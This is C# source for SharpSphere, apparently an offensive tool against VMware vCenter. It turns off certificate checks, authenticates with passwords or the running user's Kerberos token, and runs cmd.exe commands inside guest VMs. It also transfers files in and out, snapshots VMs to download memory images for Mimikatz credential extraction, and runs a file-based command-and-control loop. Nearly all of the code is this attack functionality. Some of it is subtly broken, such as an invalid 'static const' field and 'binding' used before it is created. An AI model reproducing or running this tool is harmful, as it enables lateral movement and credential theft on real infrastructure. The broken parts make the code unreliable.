using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Cache;
using System.Threading;
using CommandLine;

namespace SharpSphere
{
    using System.Linq;
    using vSphere;
    using NSspi;
    using NSspi.Contexts;
    using NSspi.Credentials;
    using System.Net;
    using System.ServiceModel;
    using System.ServiceModel.Security;
    using SharpSphere.Security;

    internal class Program
    {
        private static const int MAX_MESSAGE_SIZE = 2147483647;
        private static ManagedObjectReference guestFileManager;
        private static VimPortTypeClient vim;
        private static ManagedObjectReference vm;
        private static ServiceContent serviceContent;
        private static GuestAuthentication creds;
        private static System.ServiceModel.BasicHttpBinding binding;
        //private static System.ServiceModel.Channels.Binding test;
        private static UserSession userSession = null;
        private static string datacenterName;
        static void Log(string a)
        {
            Console.WriteLine(a);
        }
        static void Error(Exception e)
        {
            Log("Error: " + e.Message);
            System.Environment.Exit(1);
        }


        static void Connect(string url, string username, string password, string ip)
        {
            try
            {
                //Disable SSL
                Log("[x] Disabling SSL checks in case vCenter is using untrusted/self-signed certificates");
                System.Net.ServicePointManager.ServerCertificateValidationCallback = ((sender, certificate, chain, sslPolicyErrors) => true);

                //Create the vCenter API object
                Log("[x] Creating vSphere API interface");

                binding = new System.ServiceModel.BasicHttpBinding
                {
                    AllowCookies = true,

                };
                binding.Security.Mode = System.ServiceModel.BasicHttpSecurityMode.Transport;

                ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc0 | 0x300 | 0xc00);

                var endpoint = new System.ServiceModel.EndpointAddress(url);
                vim = new VimPortTypeClient(binding, endpoint);
                var moref = new ManagedObjectReference
                {
                    type = "ServiceInstance",
                    Value = "ServiceInstance",
                };

                //Bind to vCenter
                serviceContent = vim.RetrieveServiceContent(moref);
                Log("[x] Connected to " + serviceContent.about.fullName);

                //Attempt login
                if (username != null && password != null)
                {
                    //Login with username and password
                    Log("[x] Authenticating with provided username and password");
                    userSession = vim.Login(serviceContent.sessionManager, username, password, null);
                }
                else
                {
                    //SspiHelper from https://github.com/m1chaeldg/vSphereSdkSspiSample
                    string host = new Uri(url).Host;
                    string domain = Environment.UserDomainName;
                    Log("[x] Authenticating with SSPI token of executing user");
                    userSession = vim.LoginBySSPI(serviceContent.sessionManager, GetSspiToken("host/" + host + "@" + domain), null);
                }
                if (userSession is null)
                    Error(new Exception("Failed to authenticate."));
                Log("[x] Successfully authenticated");

                //Retrieve filemanager
                guestFileManager = GetProperty<ManagedObjectReference>(serviceContent.guestOperationsManager, "fileManager");
                if (guestFileManager is null)
                    Error(new Exception("Failed to retrieve filemanager"));

                //Get the current session and check it's valid
                UserSession currentSession = GetProperty<UserSession>(serviceContent.sessionManager, "currentSession");
                if (currentSession is null || currentSession.key != userSession.key)
                    Error(new Exception("Failed to retrieve current session"));

                //Retrieve target VM
                if (ip != null)
                    vm = vim.FindByIp(serviceContent.searchIndex, null, ip, true);

            }
            catch (Exception fault) //Generic catch all
            {
                Error(fault);
            }
        }

        static string GetSspiToken(string principal)
        {
            SspiHelper ch = new SspiHelper(principal);
            byte[] ct = null;
            byte[] st = null;
            bool cc = true;

            // Get the base64 token for the current Windows logon session.
            ch.InitializeClient(out ct, st, out cc, SspiPackageType.Kerberos);
            return Convert.ToBase64String(ct);
        }

        static void ExecuteCommand(GuestAuthentication creds, string arguments, string programPath, string workingDirectory, bool output)
        {
            try
            {
                ManagedObjectReference processManager = GetProperty<ManagedObjectReference>(serviceContent.guestOperationsManager, "processManager");

                var guestProgramSpec = new GuestProgramSpec()
                {
                    arguments = arguments,
                    programPath = programPath,
                    workingDirectory = workingDirectory,
                };

                if (output)
                {
                    //Set file to receive output
                    var outfile = Path.GetRandomFileName();
                    guestProgramSpec.arguments += @" > "+ workingDirectory + "\\" + outfile + @" 2>&1";

                    //Start the program and receive the PID back
                    Log("[x] Attempting to run cmd with the following arguments: " + guestProgramSpec.arguments);
                    Log(@"[x] Temporarily saving out to " + workingDirectory + "\\" + outfile);
                    long pid = vim.StartProgramInGuest(processManager, vm, creds, guestProgramSpec);

                    //Display PID
                    Log("[x] Process started with PID " + pid + " waiting for execution to finish");

                    bool finished = false;
                    while (!finished)
                    {
                        //Get status of our process
                        long[] pids = { pid };
                        GuestProcessInfo[] guestProcessInfo = vim.ListProcessesInGuest(processManager, vm, creds, pids);
                        if (guestProcessInfo.Length == 0)
                        {
                            Log("Error retrieving status of the process, check for the existance of the output file manually");
                        }
                        if (guestProcessInfo[0].exitCodeSpecified)
                        {
                            Log("[x] Execution finished, attempting to retrieve the results");
                            //Get the results
                            var fileTransferInformation = vim.InitiateFileTransferFromGuest(guestFileManager, vm, creds, workingDirectory + "\\" + outfile);
                            using (var client = new System.Net.WebClient())
                            {
                                client.CachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
                                var results = client.DownloadString(fileTransferInformation.url);
                                Log("[x] Output: ");
                                Log(results);
                            }

                            //Delete the file
                            vim.DeleteFileInGuest(guestFileManager, vm, creds, workingDirectory + "\\" + outfile);
                            Log("[x] Output file deleted");

                            finished = true;
                        }
                    }
                }
                else
                {

                    //Start the program and receive the PID back
                    Log("[x] Attempting to execute with cmd /c the following command: " + guestProgramSpec.arguments);
                    long pid = vim.StartProgramInGuest(processManager, vm, creds, guestProgramSpec);

                    //Display PID
                    Log("[x] Process started with PID" + pid);
                }

            }
            catch (Exception fault)
            
            {
                Error(fault);
            }
        }

        private static GuestAuthentication GuestAuth(string sspiToken)
        {
            SSPIAuthentication guestAuth = new SSPIAuthentication()
            {
                sspiToken = sspiToken,
            };
            ManagedObjectReference guestAuthManager = GetProperty<ManagedObjectReference>(serviceContent.guestOperationsManager, "authManager");
            try
            {
              return vim.AcquireCredentialsInGuest(guestAuthManager, vm, guestAuth);
                
            }
            catch (Exception e)
            {
                Error(e);
            }
            return null;
        }

        static int Execute(ExecuteOptions options)
        {
            try
            {
                //Connect to target VM
                Connect(options.url, options.username, options.password, options.ip);

                
                //Build credential object to authenticate to guest OS
                if (options.guestusername == null && options.guestpassword == null)
                {
                    Log("[x] Authenticating to guest using pass through authentication (SSPI)");
                    string host = GetProperty<GuestInfo>(vm, "guest").hostName;
                    string domain = Environment.UserDomainName;
                    string principal = "host/" + host + "@" + domain;
                    creds = GuestAuth(GetSspiToken(principal));
                } else
                {
                    Log("[x] Authenticating to guest using provided username and password");
                    creds = new NamePasswordAuthentication()
                    {
                        username = options.guestusername,
                        password = options.guestpassword,
                        interactiveSession = true,
                    };
                }
                ExecuteCommand(creds, "/c " + options.command, @"C:\Windows\System32\cmd.exe", options.outputDir, options.output);
            }
            catch (Exception fault)
            {
                Error(fault);
            }
            return 0;
        }

        static int List(ListOptions options)
        {
            try
            {
                //Connect to target
                Connect(options.url, options.username, options.password, null);

                //Connect to target VM
                var childEntities = GetProperty<ManagedObjectReference[]>(serviceContent.rootFolder, "childEntity");
                var datacenters = childEntities.Where(e => e.type == "Datacenter");

                foreach (var datacenter in datacenters)
                {

                    var vmFolder = GetProperty<ManagedObjectReference>(datacenter, "vmFolder");
                    var datacenterVms = ScanForVms(vmFolder);

                    foreach (var vm in datacenterVms)
                    {
                        GuestInfo guest = GetProperty<GuestInfo>(vm, "guest");
                        VirtualMachineConfigInfo config = GetProperty<VirtualMachineConfigInfo>(vm, "config");
                        VirtualMachineRuntimeInfo runtime = GetProperty<VirtualMachineRuntimeInfo>(vm, "runtime");
                        Console.WriteLine("Name: " + config.name + " | Power: " + runtime.powerState.ToString() + " | OS: " + config.guestFullName + " | Tools: " + guest.toolsVersionStatus2 + " | IP: " + guest.ipAddress);

                    }
                }
            }
            catch (Exception fault)
            {
                Error(fault);
            }
            return 0;
        }

        static ManagedObjectReference GetTargetVM(string name)
        {
            var childEntities = GetProperty<ManagedObjectReference[]>(serviceContent.rootFolder, "childEntity");
            var datacenters = childEntities.Where(e => e.type == "Datacenter");
            foreach (var datacenter in datacenters)
            {
                var vmFolder = GetProperty<ManagedObjectReference>(datacenter, "vmFolder");
                var datacenterVms = ScanForVms(vmFolder);

                foreach (var vm in datacenterVms)
                {
                    VirtualMachineConfigInfo config = GetProperty<VirtualMachineConfigInfo>(vm, "config");
                    if (config.name == name)
                    {
                        datacenterName = GetProperty<string>(datacenter, "name");
                        return vm;
                    }
                }
            }
            return null;
        }

        static ManagedObjectReference GetSnapshot(string targetvm, bool takeNew)
        {
            if (takeNew)
            {
                VirtualMachineRuntimeInfo runtime = GetProperty<VirtualMachineRuntimeInfo>(vm, "runtime");
                if (runtime.powerState.ToString() != "poweredOn")
                {
                    Error(new Exception("VM is not powered on, no point snapshotting"));
                }
                Log("[x] Creating snapshot for VM " + targetvm + "...");
                ManagedObjectReference task = vim.CreateSnapshot_Task(vm, "System Backup " + DateTime.Now.ToString(), "System Backup" + DateTime.Now.ToString(), true, true);
                string state = GetProperty<TaskInfo>(task, "info").state.ToString();
                while (state != "success")
                {
                    switch (state)
                    {
                        case "error":
                            Error(new Exception("Error creating snapshot"));
                            break;
                        case "running":
                            Thread.Sleep(10000);
                            break;

                    }
                    state = GetProperty<TaskInfo>(task, "info").state.ToString();
                }
                Log("[x] Snapshot created successfully");
                return (ManagedObjectReference)GetProperty<TaskInfo>(task, "info").result;

            }
            else
            {
                Log("[x] Finding existing snapshots for " + targetvm + "...");
                VirtualMachineSnapshotInfo snapshotInfo = null;
                try
                {
                    snapshotInfo = GetProperty<VirtualMachineSnapshotInfo>(vm, "snapshot");

                }
                catch (Exception e)
                {
                    Error(new Exception("No existing snapshots found for the VM " + targetvm + ", recommend you try again with --snapshot set"));
                }
                return snapshotInfo.currentSnapshot;
            }
        }

        static HostDatastoreBrowserSearchSpec GetHostDatastoreBrowserSearchSpec()
        {
            string[] extensions = { "*.vmem" };
            return new HostDatastoreBrowserSearchSpec()
            {
                matchPattern = extensions,
                searchCaseInsensitive = true,
                searchCaseInsensitiveSpecified = true,
                details = new FileQueryFlags()
                {
                    fileOwner = true,
                    fileSize = true,
                    fileType = true,
                    fileOwnerSpecified = true,
                    modification = true,
                },
            };
        }

        static int Dump(DumpOptions options)
        {
            try
            {
                //Connect to target
                Connect(options.url, options.username, options.password, null);

                //Find target VM
                vm = GetTargetVM(options.targetvm);
                if (vm is null) Error(new Exception("Failed to find target VM " + options.targetvm + ", are you sure the name is right?"));

                //Create Snapshot if specified, otherwise find existing one
                ManagedObjectReference snapshot = GetSnapshot(options.targetvm, options.snapshot);

                //Get information about the snapshot
                VirtualMachineFileInfo fileInfo = GetProperty<VirtualMachineConfigInfo>(snapshot, "config").files;

                //Build the objects we need
                ManagedObjectReference environmentBrowser = GetProperty<ManagedObjectReference>(vm, "environmentBrowser");
                ManagedObjectReference datastoreBrowser = GetProperty<ManagedObjectReference>(environmentBrowser, "datastoreBrowser");

                //Search for a vmem file
                ManagedObjectReference task = vim.SearchDatastore_Task(datastoreBrowser, fileInfo.snapshotDirectory, GetHostDatastoreBrowserSearchSpec());
                TaskInfo info = GetProperty<TaskInfo>(task, "info");
                string state = info.state.ToString();
                while (state != "success")
                {
                    switch (state)
                    {
                        case "error":
                            Error(new Exception("Error searching datastore for snapshot files"));
                            break;
                        case "running":
                            Thread.Sleep(1000);
                            break;

                    }
                    state = GetProperty<TaskInfo>(task, "info").state.ToString();
                }
                HostDatastoreBrowserSearchResults results = (HostDatastoreBrowserSearchResults)GetProperty<TaskInfo>(task, "info").result;


                //Check at least one vmem exists, which it may not if not using --snapshot
                FileInfo latestFile = null;
                if (results.file.Length == 0)
                {
                    Error(new Exception("Failed to find any .vmem files associated with the VM, despite there being snapshots. Virtual machine memory may not have been captured. Recommend rerunning with --snapshot"));
                }

                //Grab the latest .vmem file if there is more than one associated with a VM                
                foreach (FileInfo file in results.file)
                {
                    if (latestFile == null || DateTime.Compare(file.modification, latestFile.modification) > 0)
                    {
                        latestFile = file;
                    }
                }

                //Build the URLs to download directly from datastore
                string host = options.url.Remove(options.url.Length - 4);
                string dsName = FindTextBetween(results.folderPath, "[", "]");
                string folderPath = results.folderPath.Remove(0, dsName.Length + 3);
                string vmemURL = host + "/folder/" + folderPath + latestFile.path + "?dcPath=" + datacenterName + "&dsName=" + dsName;
                string vmsnURL = host + "/folder/" + folderPath + latestFile.path.Replace(".vmem", ".vmsn") + "?dcPath=" + datacenterName + "&dsName=" + dsName;
                string vmemFile = options.destination.Replace("\"", string.Empty) + @"\" + Path.GetRandomFileName();
                string vmsnFile = options.destination.Replace("\"", string.Empty) + @"\" + Path.GetRandomFileName();
                string zipFile = options.destination.Replace("\"", string.Empty) + @"\" + Path.GetRandomFileName();

                //Make the web requests
                using (var client = new System.Net.WebClient())
                {
                    client.Credentials = new System.Net.NetworkCredential(options.username, options.password);
                    client.Headers.Set(System.Net.HttpRequestHeader.ContentType, "application/octet-stream");
                    client.CachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
                    Log("[x] Downloading " + latestFile.path + " (" + latestFile.fileSize / 1048576 + @"MB) to " + vmemFile + "...");
                    client.DownloadFile(vmemURL, vmemFile);

                    Log("[x] Downloading " + latestFile.path.Replace(".vmem", ".vmsn") + " to " + vmsnFile + "...");
                    client.DownloadFile(vmsnURL, vmsnFile);
                }

                //Zip up the two downloaded files
                Log("[x] Download complete, grab the files " + vmemFile + " and " + vmsnFile);
                
                //Zipping not supported in .NET4.0, TODO: reimplment
/*                var zip = ZipFile.Open(zipFile, ZipArchiveMode.Create);
                zip.CreateEntryFromFile(vmemFile, Path.GetFileName(vmemFile), CompressionLevel.Optimal);
                zip.CreateEntryFromFile(vmsnFile, Path.GetFileName(vmsnFile), CompressionLevel.Optimal);
                zip.Dispose();
                File.Delete(vmemFile);
                File.Delete(vmsnFile);
                System.IO.FileInfo zipFileInfo = new System.IO.FileInfo(zipFile);
                Log("[x] Zipping complete, download " + zipFile + " (" + zipFileInfo.Length / 1048576 + "MB), rename to .zip, and follow instructions to use with Mimikatz");*/



                //Delete the snapshot we created if needed
                if (options.snapshot)
                {
                    Log("[x] Deleting the snapshot we created");
                    vim.RemoveSnapshot_Task(snapshot, false, true);
                }

            }
            catch (Exception fault)
            {
                Error(fault);
            }
            return 0;
        }

        //Helper function for stripping datastore name
        static string FindTextBetween(string text, string left, string right)
        {
            int beginIndex = text.IndexOf(left); // find occurence of left delimiter
            beginIndex += left.Length;
            int endIndex = text.IndexOf(right, beginIndex); // find occurence of right delimiter
            return text.Substring(beginIndex, endIndex - beginIndex).Trim();
        }


        static void ScanForVmsRecurse(ManagedObjectReference obj, int depth, List<ManagedObjectReference> vms)
        {
            if (depth > 10)
            {
                return;
            }
            else if (obj.type == "VirtualMachine")
            {
                vms.Add(obj);
            }
            else if (obj.type == "Folder")
            {
                var children = GetProperty<ManagedObjectReference[]>(obj, "childEntity");
                foreach (var child in children)
                    ScanForVmsRecurse(child, depth + 1, vms);
            }
            else if (obj.type == "VirtualApp")
            {
                var vmList = GetProperty<ManagedObjectReference[]>(obj, "vm");
                foreach (var v in vmList)
                    ScanForVmsRecurse(v, depth + 1, vms);
            }
        }
        static List<ManagedObjectReference> ScanForVms(ManagedObjectReference folder)
        {
            var vms = new List<ManagedObjectReference>();
            ScanForVmsRecurse(folder, 0, vms);
            return vms;
        }


        private static PropertyFilterSpec[] GetSinglePropSpec(ManagedObjectReference from, string propName)
        {
            return new PropertyFilterSpec[]
            {
                new PropertyFilterSpec
                {
                    objectSet = new ObjectSpec[]
                    {
                        new ObjectSpec
                        {
                            obj = from,
                        },
                    },
                    propSet = new PropertySpec[]
                    {
                        new PropertySpec
                        {
                            type = from.type,
                            pathSet = new string[] { propName },
                        },
                    },
                     reportMissingObjectsInResults = true,
                     reportMissingObjectsInResultsSpecified = true,
                }
            };
        }
        private static T GetProperty<T>(ManagedObjectReference from, string propName) where T : class
        {
            var result = vim.RetrievePropertiesEx(serviceContent.propertyCollector, GetSinglePropSpec(from, propName), new RetrieveOptions() { });
            if (result is null)
                Error(new Exception("RetrievePropertiesEx failed"));
            return result.objects[0].propSet[0].val as T;
        }



        static void UploadFile(GuestAuthentication creds, string source, string destination)
        {
            try
            {
                byte[] data = System.IO.File.ReadAllBytes(source);
                var fileTransferUrl = vim.InitiateFileTransferToGuest(guestFileManager, vm, creds, destination, new GuestFileAttributes(), data.Length, true);
                using (var client = new System.Net.WebClient())
                {
                    client.CachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
                    Log("[x] Starting upload of " + source + " to " + destination + "...");
                    client.UploadFile(fileTransferUrl, "PUT", source);
                    Log("[x] Uploaded " + source + " to " + destination + " on the guest");
                }
            }
            catch (Exception fault)
            {
                Error(fault);
            }
        }
        static int Upload(UploadOptions options)
        {
            try
            {
                //Connect to target VM
                Connect(options.url, options.username, options.password, options.ip);
                //Build credential object to authenticate to guest OS
                creds = new NamePasswordAuthentication()
                {
                    username = options.guestusername,
                    password = options.guestpassword,
                    interactiveSession = true,
                };
                UploadFile(creds, options.source, options.destination);
            }
            catch (Exception fault)
            {
                Error(fault);
            }
            return 0;
        }
        static void DownloadFile(GuestAuthentication creds, string source, string destination)
        {
            try
            {
                var fileTransferInformation = vim.InitiateFileTransferFromGuest(guestFileManager, vm, creds, source);
                using (var client = new System.Net.WebClient())
                {
                    client.CachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
                    client.DownloadFile(fileTransferInformation.url, destination);
                    Log("[x] Downloaded " + source + " to " + destination + " on this machine");
                }
            }
            catch (Exception fault)
            {
                Error(fault);
            }
        }
        static int Download(DownloadOptions options)
        {
            try
            {
                //Connect to target VM
                Connect(options.url, options.username, options.password, options.ip);
                //Build credential object to authenticate to guest OS
                creds = new NamePasswordAuthentication()
                {
                    username = options.guestusername,
                    password = options.guestpassword,
                    interactiveSession = true,
                };
                DownloadFile(creds, options.source, options.destination);
            }
            catch (Exception fault)
            {
                Error(fault);
            }
            return 0;
        }
        static int StartC2(C2Options options)
        {
            try
            {
                //Connect to target VM
                Connect(options.url, options.username, options.password, options.ip);
                //Build credential object to authenticate to guest OS
                creds = new NamePasswordAuthentication()
                {
                    username = options.guestusername,
                    password = options.guestpassword,
                    interactiveSession = true,
                };

                if (!Directory.Exists(options.localdir))
                {
                    Error(new Exception("Cannot read local dir " + options.localdir));

                }

                //Make sure paths have a trailing slash
                if (!options.localdir.EndsWith("\\"))
                {
                    options.localdir += "\\";
                }
                if (!options.guestdir.EndsWith("\\"))
                {
                    options.guestdir += "\\";
                }
                while (true)
                {
                    string[] sourceFilePaths = Directory.GetFiles(options.localdir);
                    if (!Array.Exists(sourceFilePaths, element => element.Contains("lock")) && Array.Exists(sourceFilePaths, element => element.Contains(options.outputid)))
                    {
                        foreach (string sourceFilePath in sourceFilePaths)
                        {
                            var fileName = Path.GetFileName(sourceFilePath);
                            byte[] data = System.IO.File.ReadAllBytes(sourceFilePath);
                            var newFilePath = options.guestdir + fileName;
                            var fileTransferUrl = vim.InitiateFileTransferToGuest(guestFileManager, vm, creds, newFilePath + ".lock", new GuestFileAttributes(), data.Length, true);
                            using (var client = new System.Net.WebClient())
                            {
                                client.UploadData(fileTransferUrl, "PUT", data);
                                Log("[x] Uploaded a packet to guest");
                            }
                            vim.MoveFileInGuest(guestFileManager, vm, creds, newFilePath + ".lock", newFilePath, true);
                            File.Delete(sourceFilePath);
                        }
                    }
                    GuestListFileInfo guestFilesRaw = vim.ListFilesInGuest(guestFileManager, vm, creds, options.guestdir, 0, 999, options.inputid + "*");
                    if (guestFilesRaw.files != null)
                    {
                        bool lockFilePresent = false;

                        foreach (GuestFileInfo guestFile in guestFilesRaw.files)
                        {
                            if (guestFile.path.Contains("lock"))
                            {
                                lockFilePresent = true;
                                break;
                            }
                        }
                        if (!lockFilePresent)
                        {
                            foreach (GuestFileInfo guestFile in guestFilesRaw.files)
                            {
                                if (guestFile.type == "file" && !guestFile.path.Contains("lock"))
                                {
                                    var fileTransferInformation = vim.InitiateFileTransferFromGuest(guestFileManager, vm, creds, options.guestdir + guestFile.path);
                                    string newFilePath = options.localdir + guestFile.path;
                                    using (var client = new System.Net.WebClient())
                                    {
                                        Log("[x] Downloading a packet from guest");
                                        client.DownloadFile(fileTransferInformation.url, newFilePath + @".lock");
                                    }
                                    File.Move(newFilePath + @".lock", newFilePath);
                                    vim.DeleteFileInGuest(guestFileManager, vm, creds, options.guestdir + guestFile.path);
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception fault)
            {
                Error(fault);
            }
            return 0;
        }



        public static void Main(string[] args)
        {
            binding.MaxBufferPoolSize = MAX_MESSAGE_SIZE;
            binding.MaxBufferSize = MAX_MESSAGE_SIZE;
            binding.MaxReceivedMessageSize = MAX_MESSAGE_SIZE;
            binding.ReaderQuotas.MaxStringContentLength = MAX_MESSAGE_SIZE;
            binding.ReaderQuotas.MaxArrayLength = MAX_MESSAGE_SIZE;
            binding.ReaderQuotas.MaxDepth = MAX_MESSAGE_SIZE;
            binding.ReaderQuotas.MaxBytesPerRead = MAX_MESSAGE_SIZE;
            
            Parser.Default.ParseArguments<DumpOptions, ListOptions, ExecuteOptions, C2Options, UploadOptions, DownloadOptions>(args).MapResult(
                (DumpOptions options) => Dump(options),
                (ListOptions options) => List(options),
                (ExecuteOptions options) => Execute(options),
                (C2Options options) => StartC2(options),
                (UploadOptions options) => Upload(options),
                (DownloadOptions options) => Download(options),
                errors => 1);

        }


    }
}
